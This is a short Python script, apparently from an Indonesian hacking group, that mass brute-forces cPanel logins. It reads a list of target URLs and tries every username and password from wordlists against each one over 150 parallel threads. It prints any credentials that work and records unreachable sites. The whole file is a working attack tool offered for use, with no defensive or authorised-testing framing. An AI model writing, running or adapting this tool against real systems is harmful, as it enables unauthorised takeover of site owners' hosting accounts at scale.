import os
import concurrent.futures
import requests

# Membersihkan layar terminal
os.system("clear" if os.name == "posix" else "cls")

print("""               TOOLS BRUTE-FORCE CPANEL
             BY GARUDA SECURITY VVIP CHANEL""")

def brute_force_cpanel(url, username_list, password_list, dead_websites):
    with open(username_list, 'r') as users, open(password_list, 'r') as passwords:
        usernames = users.readlines()
        passwords = passwords.readlines()

    for username in usernames:
        for password in passwords:
            credentials = {'user': username.strip(), 'pass': password.strip()}
            response = requests.post(url, data=credentials)

            if "Login failed" not in response.text:
                print(f"Credentials Found! Username: {username.strip()}, Password: {password.strip()}, URL: {url}")
                return

    print(f"Brute force failed for URL: {url}. No valid credentials found.")
    with open(dead_websites, 'a') as dead_file:
        dead_file.write(f"{url}\n")

# Usage
url_list = input("Masukan list target: ")
username_list = "user.txt"
password_list = "pass.txt"

# Menambahkan file untuk menyimpan website yang mati
dead_websites_file = "Website_mati.txt"

with open(url_list, 'r') as urls:
    with concurrent.futures.ThreadPoolExecutor(max_workers=150) as executor:
        futures = {executor.submit(brute_force_cpanel, url.strip(), username_list, password_list, dead_websites_file): url.strip() for url in urls}

        for future in concurrent.futures.as_completed(futures):
            url = futures[future]
            try:
                future.result()
            except Exception as e:
                print(f"An error occurred for URL {url}: {e}")
